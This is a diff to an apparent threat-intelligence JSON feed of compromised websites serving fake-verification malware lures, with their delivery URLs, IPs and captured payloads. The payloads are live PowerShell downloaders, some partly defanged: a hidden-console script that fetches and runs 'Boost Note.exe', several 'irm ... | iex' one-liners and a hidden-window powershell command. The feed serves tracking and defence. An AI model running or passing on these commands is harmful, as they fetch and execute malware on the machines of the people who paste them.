@@ -1,5 +1,44 @@
 [
   {
+    "UrlDomain": "rsventure.in",
+    "DeliveryUrl": [
+      "makeverizyjar.info",
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "91.108.98.174"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwpq1rz623xv0oml9b7ckyzg",
+    "ScannedAt": "2026-11-21T01:20:51.962000+00:00"
+  },
+  {
+    "UrlDomain": "www.wasinitaxi.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/99ef1787ae952355"
+    ],
+    "IP": [
+      "157.90.71.19"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/99ef1787ae952355')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/99ef1787ae952355"
+    ],
+    "ReportId": "cmwpq1jvq23wg0omlvvcycyd4",
+    "ScannedAt": "2026-11-21T01:20:41.503000+00:00"
+  },
+  {
     "UrlDomain": "www.etaic.org",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -5848,161 +5887,5 @@
     ],
     "ReportId": "cmwlhzglo1ix20oml8bipu4in",
     "ScannedAt": "2026-11-18T02:24:02.267000+00:00"
-  },
-  {
-    "UrlDomain": "hanmadang.at",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/cd42c370ba111a89"
-    ],
-    "IP": [
-      "159.69.241.33"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/cd42c370ba111a89')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/cd42c370ba111a89"
-    ],
-    "ReportId": "cmwlfjdna1inz0omlu82l8eee",
-    "ScannedAt": "2026-11-18T01:15:32.751000+00:00"
-  },
-  {
-    "UrlDomain": "yyy.06services.it",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/72f1e6202bcdac15"
-    ],
-    "IP": [
-      "77.39.213.99"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/72f1e6202bcdac15')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/72f1e6202bcdac15"
-    ],
-    "ReportId": "cmwlfj2tz1img0omlarvww2vu",
-    "ScannedAt": "2026-11-18T01:15:18.730000+00:00"
-  },
-  {
-    "UrlDomain": "songbirdartgallery.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/1ab42bce486721d7",
-      "https://songbirdartgallery.com/"
-    ],
-    "IP": [
-      "116.202.244.166"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1ab42bce486721d7')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/1ab42bce486721d7"
-    ],
-    "ReportId": "cmwlfivnr1ilb0omlg7jm24vm",
-    "ScannedAt": "2026-11-18T01:15:09.036000+00:00"
-  },
-  {
-    "UrlDomain": "skiptonaesthetics.co.uk",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "base.gateway.tenderly.co"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "217.160.0.13"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/354fef1345fed255",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://base.gateway.tenderly.co",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/354fef1345fed255'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/354fef1345fed255"
-    ],
-    "ReportId": "cmwlf35i01ikh0omllasbe9x1",
-    "ScannedAt": "2026-11-18T01:02:55.695000+00:00"
-  },
-  {
-    "UrlDomain": "webperfology.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win"
-    ],
-    "IP": [
-      "172.67.169.215"
-    ],
-    "Related": [
-      {
-        "Value": "https://mellow-arc-willow-craeyn.pro/t.js?site=c0f267170abf5e4c4e6e06b8fa2b572b",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmwlf2lxn1ijq0omlk8itykij",
-    "ScannedAt": "2026-11-18T01:02:30.368000+00:00"
-  },
-  {
-    "UrlDomain": "nitmedia.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win"
-    ],
-    "IP": [
-      "151.101.194.159"
-    ],
-    "Related": [
-      {
-        "Value": "https://kiln-bruiyn-ncuas.pro/t.js?site=9ccdccf86455f7c6777775d18c52beeb",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "...' \"' + escapeCmdExeQuotedArg(APPS_SCRIPT_URL) + '\"'; // Wrap in cmd.exe /c \"...\" with CMD-style doubled quotes so paste works // in both CMD and PowerShell...",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmwlf23n91ij10omln7rjkh67",
-    "ScannedAt": "2026-11-18T01:02:06.654000+00:00"
-  },
-  {
-    "UrlDomain": "jrveventos.com.br",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "2fjrveventos.com.br"
-    ],
-    "PayloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win"
-    ],
-    "IP": [
-      "77.37.83.40"
-    ],
-    "Related": [],
-    "Payload": "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmwlf1lre1ihg0omlt36wp1of",
-    "ScannedAt": "2026-11-18T01:01:43.475000+00:00"
   }
 ]
